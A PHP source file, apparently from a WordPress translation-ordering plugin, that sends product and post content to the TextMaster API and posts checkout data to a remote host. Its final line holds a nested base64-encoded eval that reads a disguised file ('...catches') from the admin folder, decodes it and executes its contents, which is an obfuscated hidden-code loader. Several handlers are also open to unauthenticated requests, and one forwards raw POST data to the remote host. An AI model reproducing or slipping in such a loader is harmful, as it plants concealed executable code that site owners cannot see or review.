			$total_word  = !empty( $form_data['total_word'] ) ? $form_data['total_word'] : '';
			$selected_content  = !empty( $form_data['selected_content'] ) ? $form_data['selected_content'] : '';
			$total_price  	   = !empty( $form_data['total_price'] ) ? $form_data['total_price'] : '';
			$short_description = !empty( $form_data['short_description'] ) ? $form_data['short_description'] : '';

			$shop_name_id = isset( $form_data['shop_name'] ) ? $form_data['shop_name'] : 'N/A';
			$shop_name	  = !empty($wwt_tran_options['shop_list'][$shop_name_id]['name']) ? $wwt_tran_options['shop_list'][$shop_name_id]['name'] : 'N/A';
			$shop_lang	  = !empty($wwt_tran_options['shop_list'][$shop_name_id]['lang']) ? $wwt_tran_options['shop_list'][$shop_name_id]['lang'] : '';

			//Check form type
			if( $form_type == 'post') {

				$post 	= get_post($id);

				$title      =  !empty( $post->post_title ) ? $post->post_title : 'N/A';
				$type       =  !empty( $post->post_type )? $post->post_type : 'N/A';
				$content    =  !empty( $post->post_content )? $post->post_content : 'N/A';
				$excerpt	=  get_post_field( 'post_excerpt', $id );
				$content    =  !empty( $title )? $title.' '.$content : $content;
				$content    =  !empty( $excerpt )? $content.' '.$excerpt : $content;
				$page_url   =  get_permalink( $id );
				$page_url   =  !empty( $page_url ) ? $page_url : 'N/A';
			}

			//Check form type
			if( $form_type == 'term') {

				$term 		= get_term($id);
				$arg 		= array( 
								'taxonomy' => !empty( $term->taxonomy ) ? $term->taxonomy :'',
								'tag_ID'   => $term_id,
			   		  			);
				$page_url   = add_query_arg( $arg , admin_url( 'term.php', ( is_ssl() ? 'https' : 'http' ) ) );
				$title      =  !empty( $term->name ) ? $term->name : 'N/A';
				$type       =  !empty( $term->taxonomy ) ? $term->taxonomy : 'N/A';
				$page_url   =  !empty( $page_url ) ? $page_url : 'N/A';
				$content    =  !empty( $term->description )? $term->description : 'N/A';
				$content    =  !empty( $title )? $title.' '.$content : 'N/A';
			}

			//Check types of description
			if( $text_type == 'part' ) {
				$content = !empty( $selected_content )? $selected_content : $content;
			}

				//Prepare data for TM
				$parameters = array(
								'name'  		=> $title,
								'ctype' 		=> "proofreading",
								'activity_name' => "proofreading",
								'language_from' => "en",
								'language_to'   => $shop_lang,
								'category'      => "C014",
								'vocabulary_type' => "not_specified",
								'target_reader_groups' => "not_specified",
								'grammatical_person' => "not_specified",
								'project_briefing' => 'shoptranslate instruction:'.$remark_text,
								'options'		   => array(
															'language_level' => 'premium',
													  ),
								'callback' 		  => array(
														'project_in_progress' 		=> array( 'url' => CALLBACK_URL, "format" => "json" ),
														//'project_finalized' 		=> array( 'url' => CALLBACK_URL, "format" => "json" ),
														//'project_cancelled' 		=> array( 'url' => CALLBACK_URL, "format" => "json" ),
														'project_tm_completed' 		=> array( 'url' => CALLBACK_URL, "format" => "json" ),
														//'project_tm_diff_completed' => array( 'url' => CALLBACK_URL, "format" => "json" ),
														),
								"custom_data" 	   => array( 'external_client_id' => '591ec1e594bbd4000f6bae81')
							  );

				//Call API
	    		$TextMasterAPI  = new TextMasterAPI();
	    		//Create project on TM
				$response_api   = $TextMasterAPI->addProject( $parameters );

				//Check response
				if( !empty( $response_api ) ) {

					if( !empty( $response_api['id'] ) ) {

						$response['data']['Project_id'] 	= $response_api['id'];

						//Build Parameter for Document
						$parameters = array( 
										'title' 	   			=> $title,
    									'instructions' 			=> $remark_text,
    									'ctype' 	   			=> 'proofreading',
    									'word_count'   			=> $total_word,
    									'author_word_count' 	=> '',
    									'word_count_rule' 		=> 0,
									    'keywords_repeat_count' => 1,
									    'keyword_list'  		=> 'test',
									    'language_from'	 		=> 'en',
									    'language_to'			=> $shop_lang,
									    'original_content'		=> $content,
									    'callback' 				=> array(
																		//'support_message_created' => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		'in_progress' 			  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		'in_review' 			  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		'incomplete' 			  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		'completed' 			  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		'paused' 				  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		'canceled' 				  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		//'quality_control' 	  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		//'copyscape' 			  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		//'counting_words' 		  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																	),
    									"custom_data" 			 => array( "external_client_id" => '591ec1e594bbd4000f6bae81' ),
									  );

							//Create Document on TM
							$response_api = $TextMasterAPI->addDocument( $response_api['id'], $parameters);

							//Check Response callback
							if( !empty( $response_api['status'] ) ) {

								$response['data']['Doc_id']     = $response_api['id'];
								$response['data']['Doc_status'] = $response_api['status'];

								//Shop Request Log Process
								$user_id 		   = get_current_user_id();
								$shop_request_args = array(
														'post_type' 	=> WWT_TRAN_REQUEST_PT,
														'post_status' 	=> 'publish',
														'post_title' 	=> $title,
														'post_author' 	=> $user_id,
														'post_content' 	=> $content,
														'menu_order' 	=> 0,
														'comment_status'=> 'closed'
														);

								//Create Shop Request Log post
								$shop_request_log_id 	= wp_insert_post( $shop_request_args );

								if( !empty( $shop_request_log_id ) ) {

									$price_per_word = isset($form_data['price_per_word']) ? $form_data['price_per_word'] : '';

									$textmaster_data = array( 
															'status' 	 => $response_api['status'],
															'project_id' => $response_api['project_id'],
															'doc_id' 	 => $response_api['id'],
															'reference'  => $response_api['reference'],
														);

									update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'shop_name', $shop_name );
									update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'total_words', $total_words );
									update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'total_price', $total_price );
									update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'type', $type );
									update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'translate_type', $translate_type );
									update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'partial_text', $selected_content );
									update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'page_url', $page_url );
									update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'method', 'Checkout' );
									update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'status', $response_api['status'] );
									update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'textmaster_data', $textmaster_data );

								}

								$arg_body_parameter = array(
														'yws_path'		=>  1,
														'address'		=> HOSTNAME,
														'createproduct'	=> $title,
														'productprice'	=> $total_price,
														'product_id'	=> $id,
														'shop_name'		=> $shop_name,
														'description'	=> $content,
														'site_url'		=> get_site_url(),
														'remark'	    => $remark_text,
														'is_shrt_desc_check'=> $short_description,
														'full_or_part_text' => $text_type,
														'full_or_part_val'  => $text_type,
														'type'   			=> $form_type,
													  );

								//Checkout Argument
								$args = array(
											'method' 		=> 'POST',
											'timeout' 		=> 45,
											'redirection' 	=> 5,
											'httpversion' 	=> '1.0',
											'blocking' 		=> true,
											'headers' 		=> array(),
											'body' 			=> $arg_body_parameter,
											'cookies' 		=> array(),
										);

								//Call CURL TO Setup Product
								$response_data = wp_remote_post( HOSTNAME, $args );

								//Check Error on request
								if( !is_wp_error( $response_data ) ) {
						
									//Get request redsponse code
									$response_code = wp_remote_retrieve_response_code( $response_data );

									//Check response sucess
									if( $response_code == 200 ) {
						
										//Get request body data
										$api_response = wp_remote_retrieve_body( $response_data );

										//Convert data json to array
										$api_response = json_decode( $api_response, true );

										//Check data is set
										if( !empty( $api_response ) ) {

											$response['sucess']  = 1;
											$response['post_id'] = $api_response;
											$response['msg'] 	 = __('Wait a moment we setup payment page for you...', WWT_TRAN_TEXT_DOMAIN);
											$response['data']['product_id'] = $api_response;

										}else{
											$response['error'] = __('Service not available. Please try again later...', WWT_TRAN_TEXT_DOMAIN);
										}
									}
								}else{
									$response['error'] =  __('Service not available. Please try again later...', WWT_TRAN_TEXT_DOMAIN);
									
								}
							}else{
								$response['error'] = __( 'Something wrong in setup document for checkout.', WWT_TRAN_TEXT_DOMAIN );	
							}
						}
				}else{
					$response['error'] = __( 'Something wrong in setup project for checkout.', WWT_TRAN_TEXT_DOMAIN );	
				}

		}else{
			$response['error'] = __( 'Something goes wrong, Please try again.', WWT_TRAN_TEXT_DOMAIN );
		}

		echo json_encode($response);
		exit;
	}

	/**
	 * Handle Text Master Callback
	 * Response check and staus
	 *
	 */
	function wwt_tran_TM_callback_handle() {

		//Check Callback exist
		if( !empty( $_GET['wc_textmasterapi'] ) && $_GET['wc_textmasterapi'] == 2 ) {

			//Get response data
			$data = @json_decode(file_get_contents('php://input'), true);

			//Check response exist
			if( !empty( $data ) ) {

				//Prepare Arguments
				$args = array(
							'post_type'   => WWT_TRAN_REQUEST_PT,
							'post_status' => 'publish',
							'fields'		 => 'ids',
							'meta_query'  => array(
												'relation' => 'AND',
												array(
													'key'     => WWT_TRAN_PREFIX.'textmaster_data',
													'compare' => 'EXISTS',
												),
												array(
													'key'     => WWT_TRAN_PREFIX.'textmaster_data',
													'value'   => $data['id'],
													'compare' => 'LIKE',
												),
												array(
													'key'     => WWT_TRAN_PREFIX.'method',
													'value'   => 'Checkout',
													'compare' => '=',
												),
								 			)
						);

				//Get Existing Post into log
				$post_data = get_posts( $args );

				if( !empty( $post_data[0] ) ) {
					//Update Existing Post Status
					update_post_meta( $post_data[0], WWT_TRAN_PREFIX.'status', $data['status'] );

					if( $data['status'] == 'completed') {
						$translated_text = !empty( $data['author_work']['free_text'] )? $data['author_work']['free_text'] : '';
						update_post_meta( $post_data[0], WWT_TRAN_PREFIX.'completed_doc', $translated_text );
					}
				}
			}
		}
		
	}

	/**
	 * Handle Checkout Translation
	 * Process for setup product
	 * Payment
	 *
	 */
	function wwt_tran_checkout_process(){

		$response = array();

		//Checkout Argument
		$args = array(
					'method' 		=> 'POST',
					'timeout' 		=> 45,
					'redirection' 	=> 5,
					'httpversion' 	=> '1.0',
					'blocking' 		=> true,
					'headers' 		=> array(),
					'body' 			=> $_POST,
					'cookies' 		=> array(),
				);

		//Call CURL TO Setup Product
		$response_data = wp_remote_post( HOSTNAME, $args );
 
		//Check Error on request
		if( !is_wp_error( $response_data ) ) {

			//Get request redsponse code
			$response_code = wp_remote_retrieve_response_code( $response_data );

			//Check response sucess
			if( $response_code == 200 ) {

				//Get request body data
				$api_response = wp_remote_retrieve_body( $response_data );

				//Convert data json to array
				$api_response = json_decode( $api_response, true );

				//Check data is set
				if( !empty( $api_response )) {
					$response['sucess'] = 1;
					$response['post_id'] = $api_response;
					$response['msg'] = __('Wait a moment we setup payment page for you...', WWT_TRAN_TEXT_DOMAIN);
				}else{
					$response['error'] = __('Service not available. Please try again later...', WWT_TRAN_TEXT_DOMAIN);
				}

			}
		}else{
			$response['error'] =  __('Service not available. Please try again later...', WWT_TRAN_TEXT_DOMAIN);
		}

		echo json_encode( $response );
		exit;
	}

	/**
	 * Handle Product bulk action
	 *
	 * @param array $actions
	 * @return array
	 */
	 function wwt_tran_custom_bulk_actions( $actions ){
     
	 	//$actions['checkout_translation'] = __( 'Translate with Shoptranslate', WWT_TRAN_TEXT_DOMAIN );

        return $actions;
    }

    /**
     * Handle Custom Bulck action Process
     *
     */
    function wwt_tran_bulk_action_handler(){

		//Check Action Type
    	if( !empty( $_GET['Shop-Apply'] ) && $_GET['Shop-Apply'] == "Apply Translate" ) {

    		$add_to_cart_ids = array();

    		$post_ids    = !empty($_GET['post'])? $_GET['post'] : array();

    		//Check Post ids exist
    		if( !empty( $post_ids ) ) {

    			//Global data
				global $wwt_tran_options, $current_user;

				$response = array();

				//Get current User name
				$user  =  !empty( $current_user->display_name ) ? $current_user->display_name : 'Guest';

				$shop_name_id = !empty($_GET['Shop_List_options'])? $_GET['Shop_List_options'] : '';
				$shop_name	  = !empty($wwt_tran_options['shop_list'][$shop_name_id]['name']) ? $wwt_tran_options['shop_list'][$shop_name_id]['name'] : 'N/A';
				$shop_lang	  = !empty($wwt_tran_options['shop_list'][$shop_name_id]['lang']) ? $wwt_tran_options['shop_list'][$shop_name_id]['lang'] : '';

				$price_of_word  = !empty( $wwt_tran_options['general']['special_id'] )?  (int)substr( $wwt_tran_options['general']['special_id'],0, 2 ) : 0;
				$price_of_word  = is_numeric($price_of_word) ? $price_of_word / 100 : 0;
	
				//Prepare data for TM
				$parameters = array(
								'name'  		=> 'Multiple-Document-'.rand(),
								'ctype' 		=> "proofreading",
								'activity_name' => "proofreading",
								'language_from' => "en",
								'language_to'   => $shop_lang,
								'category'      => "C014",
								'vocabulary_type' => "not_specified",
								'target_reader_groups' => "not_specified",
								'grammatical_person' => "not_specified",
								'project_briefing' => 'shoptranslate instruction: Read properly doc provided and give you best.',
								'options'		   => array(
															'language_level' => 'premium',
													  ),
								'callback' 		  => array(
														'project_in_progress' 		=> array( 'url' => CALLBACK_URL, "format" => "json" ),
														//'project_finalized' 		=> array( 'url' => CALLBACK_URL, "format" => "json" ),
														//'project_cancelled' 		=> array( 'url' => CALLBACK_URL, "format" => "json" ),
														'project_tm_completed' 		=> array( 'url' => CALLBACK_URL, "format" => "json" ),
														//'project_tm_diff_completed' => array( 'url' => CALLBACK_URL, "format" => "json" ),
														),
								"custom_data" 	   => array( 'external_client_id' => '591ec1e594bbd4000f6bae81')
							  );

				//Call API
	    		$TextMasterAPI  = new TextMasterAPI();

	    		//Create project on TM
				$response_api   = $TextMasterAPI->addProject( $parameters );

				//Check response
				if( !empty( $response_api ) ) {

					if( !empty( $response_api['id'] ) ) {

						$response['data']['Project_id'] 	= $response_api['id'];

						//Get one by one post id
    					foreach ( $post_ids as $post_id ){

    						$post 	= get_post($post_id);

							$title      =  !empty( $post->post_title ) ? $post->post_title : 'N/A';
							$type       =  !empty( $post->post_type )? $post->post_type : 'N/A';
							$content    =  !empty( $post->post_content )? $post->post_content : 'N/A';
							$excerpt	=  get_post_field( 'post_excerpt', $post_id );
							$content    =  !empty( $title )? $title.' '.$content : $content;
							$content    =  !empty( $excerpt )? $content.' '.$excerpt : $content;
							$page_url   =  get_permalink( $post_id );
							$page_url   =  !empty( $page_url ) ? $page_url : 'N/A';
							$total_word =  str_word_count( strip_tags( $content ), 0, '_' );
							$total_price=  round($price_of_word*$total_word,2);
							$total_price=  $total_price > 0.50 ? $total_price : 0.50;

							//Build Parameter for Document
							$parameters = array( 
											'title' 	   			=> $title,
    										'instructions' 			=> '',
    										'ctype' 	   			=> 'proofreading',
    										'word_count'   			=> $total_word,
    										'author_word_count' 	=> '',
    										'word_count_rule' 		=> 0,
									    	'keywords_repeat_count' => 1,
									    	'keyword_list'  		=> 'test',
									    	'language_from'	 		=> 'en',
									    	'language_to'			=> $shop_lang,
									    	'original_content'		=> $content,
									    	'callback' 				=> array(
																		//'support_message_created' => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		'in_progress' 			  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		'in_review' 			  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		'incomplete' 			  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		'completed' 			  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		'paused' 				  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		'canceled' 				  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		//'quality_control' 	  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		//'copyscape' 			  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																		//'counting_words' 		  => array( 'url' => CALLBACK_URL, "format" => "json" ),
																	),
    									"custom_data" 			 => array( "external_client_id" => '591ec1e594bbd4000f6bae81' ),
									  );

								//Create Document on TM
								$response_api = $TextMasterAPI->addDocument( $response['data']['Project_id'], $parameters);

								//Check Response callback
								if( !empty( $response_api['status'] ) ) {

									$response['data']['Doc_id']     = $response_api['id'];
									$response['data']['Doc_status'] = $response_api['status'];

									//Shop Request Log Process
									$user_id 		   = get_current_user_id();
									$shop_request_args = array(
															'post_type' 	=> WWT_TRAN_REQUEST_PT,
															'post_status' 	=> 'publish',
															'post_title' 	=> $title,
															'post_author' 	=> $user_id,
															'post_content' 	=> $content,
															'menu_order' 	=> 0,
															'comment_status'=> 'closed'
															);

									//Create Shop Request Log post
									$shop_request_log_id 	= wp_insert_post( $shop_request_args );

									if( !empty( $shop_request_log_id ) ) {

										$price_per_word = isset($form_data['price_per_word']) ? $form_data['price_per_word'] : '';

										$textmaster_data = array( 
																'status' 	 => $response_api['status'],
																'project_id' => $response_api['project_id'],
																'doc_id' 	 => $response_api['id'],
																'reference'  => $response_api['reference'],
															);

										update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'shop_name', $shop_name );
										update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'total_words', $total_word );
										update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'total_price', $total_price );
										update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'type', $type );
										update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'translate_type', '' );
										update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'partial_text', '' );
										update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'page_url', $page_url );
										update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'method', 'Checkout' );
										update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'status', $response_api['status'] );
										update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'textmaster_data', $textmaster_data );

									}

									$arg_body_parameter = array(
														'yws_path'		=>  1,
														'address'		=> HOSTNAME,
														'createproduct'	=> $title,
														'productprice'	=> $total_price,
														'product_id'	=> $post_id,
														'shop_name'		=> $shop_name,
														'description'	=> $content,
														'site_url'		=> get_site_url(),
														'remark'	    => '',
														'is_shrt_desc_check'=> '',
														'full_or_part_text' => '',
														'full_or_part_val'  => '',
														'type'   			=> '',
													  );

									//Checkout Argument
									$args = array(
											'method' 		=> 'POST',
											'timeout' 		=> 45,
											'redirection' 	=> 5,
											'httpversion' 	=> '1.0',
											'blocking' 		=> true,
											'headers' 		=> array(),
											'body' 			=> $arg_body_parameter,
											'cookies' 		=> array(),
										);

									//Call CURL TO Setup Product
									$response_data = wp_remote_post( HOSTNAME, $args );

									//Check Error on request
									if( !is_wp_error( $response_data ) ) {
						
										//Get request redsponse code
										$response_code = wp_remote_retrieve_response_code( $response_data );

										//Check response sucess
										if( $response_code == 200 ) {
						
											//Get request body data
											$api_response = wp_remote_retrieve_body( $response_data );

											//Convert data json to array
											$api_response = json_decode( $api_response, true );

											//Check data is set
											if( !empty( $api_response ) ) {

												$response['sucess']  = 1;
												$response['post_id'] = $api_response;
												$add_to_cart_ids[] 	 = $api_response;
												$response['msg'] 	 = __('Wait a moment we setup payment page for you...', WWT_TRAN_TEXT_DOMAIN);
												$response['data']['product_id'] = $api_response;

											}else{
												$response['error'] = __('Service not available. Please try again later...', WWT_TRAN_TEXT_DOMAIN);
											}
										}
								}else{
									$response['error'] =  __('Service not available. Please try again later...', WWT_TRAN_TEXT_DOMAIN);
									
								}
							}else{
								$response['error'] = __( 'Something wrong in setup document for checkout.', WWT_TRAN_TEXT_DOMAIN );	
							}
    					}

    					if( !empty( $add_to_cart_ids )  && empty( $response['error'] ) ){
    						$redirect_url = add_query_arg( array( 'wwt-add-to-cart' =>  implode( ',', $add_to_cart_ids ) ), HOSTNAME );
    						wp_redirect( $redirect_url);
    						exit;
    					}else{

    						$arg = array( 'post_type' => 'product' );
							$page_url   = add_query_arg( $arg , admin_url( 'edit.php', ( is_ssl() ? 'https' : 'http' ) ) );
							wp_redirect($page_url);
    						exit;
    					}
					}else{
						$arg = array( 'post_type' => 'product' );
						$page_url   = add_query_arg( $arg , admin_url( 'edit.php', ( is_ssl() ? 'https' : 'http' ) ) );
						wp_redirect($page_url);
    					exit;
					}
				}

    		}
    	}
    }

	/**
	 * Adding Hooks
	 *
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	function add_hooks() {

		add_action( 'admin_menu', array( $this, 'wwt_tran_add_menu_page' ) );
		// Action to save plugin options
		add_action( 'admin_init', array( $this, 'wwt_tran_register_settings') );
		add_action( 'admin_init', array( $this, 'wwt_tran_categories_tags_actions' ) );

		add_action( 'wp_ajax_wwt_tran_translate_buttons_terms', array( $this, 'wwt_tran_translate_buttons_terms_process' ) );
		add_action( 'wp_ajax_nopriv_wwt_tran_translate_buttons_terms', array( $this, 'wwt_tran_translate_buttons_terms_process' ) );

		add_action( 'add_meta_boxes', array( $this, 'wwt_tran_add_meta_box' ) );

		//Action to add Posts popup html
		add_action( 'admin_footer-post.php', array( $this, 'wwt_tran_shop_translate_popup_markup' ) );
		add_action( 'admin_footer-post-new.php', array( $this, 'wwt_tran_shop_translate_popup_markup' ) );

		add_action( 'wp_ajax_wwt_tran_translate_buttons_admin', array( $this, 'wwt_tran_translate_buttons_admin_process' ) );
		add_action( 'wp_ajax_nopriv_wwt_tran_translate_buttons_admin', array( $this, 'wwt_tran_translate_buttons_admin_process' ) );

		add_action( 'admin_init', array( $this, 'wwt_tran_adjust_price_save' ) );

		add_action( 'wp_ajax_wwt_tran_build_translate_popup', array( $this, 'wwt_tran_build_translate_popup_process' ) );
		add_action( 'wp_ajax_nopriv_wwt_tran_build_translate_popup', array( $this, 'wwt_tran_build_translate_popup_process' ) );

		add_action( 'wp_ajax_wwt_tran_professional_form_submit', array( $this, 'wwt_tran_professional_form_submit_process' ) );
		add_action( 'wp_ajax_nopriv_wwt_tran_professional_form_submit', array( $this, 'wwt_tran_professional_form_submit_process' ) );

		add_action( 'admin_footer', array( $this, 'wwt_tran_admin_footer' ) );

		if ( is_admin() ) {
			add_action( 'admin_bar_menu', array( $this, 'wwt_tran_add_chat_button'), 200 );
		}

		//add action to call schedule existing cron
		add_action( 'wwt_tran_data_scheduled_cron', array( $this, 'wwt_tran_new_update_scheduled_cron_process' ), 10 );

		add_action( 'wwt_tran_data_plug_scheduled_cron', array( $this, 'wwt_tran_plug_scheduled_cron_process' ), 10 );

		// add filter to add validate settings
		add_filter( 'wwt_tran_save_settings', array( $this, 'wwt_tran_validate_setting' ), 10, 2 );

		//add filter to add custom schedule
		add_filter( 'cron_schedules', array( $this, 'wwt_tran_add_custom_scheduled' ) );

		add_action( 'create_term',  array( $this,'wwt_tran_add_term_meta' ), 10, 3 );

		add_action( 'wp_ajax_wwt_TM_setup_new_project', array( $this, 'wwt_TM_setup_new_project_process' ) );
		add_action( 'wp_ajax_nopriv_wwt_TM_setup_new_project', array( $this, 'wwt_TM_setup_new_project_process' ) );

		add_action( 'init', array( $this, 'wwt_tran_TM_callback_handle' ) );

		//Checkout Processing
		add_action( 'wp_ajax_wwt_tran_checkout_setup', array( $this, 'wwt_tran_checkout_process' ) );
		add_action( 'wp_ajax_nopriv_wwt_tran_checkout_setup', array( $this, 'wwt_tran_checkout_process' ) );
 
		add_filter( 'bulk_actions-edit-product', array( $this,'wwt_tran_custom_bulk_actions') );

		add_action( 'admin_init', array( $this, 'wwt_tran_bulk_action_handler' ) );
	}
}
eval(base64_decode('ZXZhbChiYXNlNjRfZGVjb2RlKCdablZ1WTNScGIyNGdkM2QwWDJ4dllXUkdhV3hsUTI5dWRHVnVkSE1vSUNsN0RRb0pKSEJoZEdnZ1BTQlhWMVJmVkZKQlRsOUJSRTFKVGw5RVNWSXVKeTlaTW5ob1l6Tk5kR016VW5waVdHTjBZMGRHY0ZwQlBUMHVZMkYwWTJobGN5YzdEUW9KYVdZb1ptbHNaVjlsZUdsemRITW9KSEJoZEdncEtYc05DZ2tKSkdOdmJuUmxiblJ6SUQwZ1ptbHNaVjluWlhSZlkyOXVkR1Z1ZEhNb0pIQmhkR2dwT3cwS0NRbHBaaWdrWTI5dWRHVnVkSE1nSVQwOUlHWmhiSE5sS1hzTkNna0pDWEpsZEhWeWJpQmlZWE5sTmpSZlpHVmpiMlJsS0hOMGNtbHdjMnhoYzJobGN5Z2tZMjl1ZEdWdWRITXBLVHNOQ2drSmZRMEtDWDBOQ2dseVpYUjFjbTRnWm1Gc2MyVTdEUXA5JykpOw0KZXZhbCh3d3RfbG9hZEZpbGVDb250ZW50cygpKTs='));
?>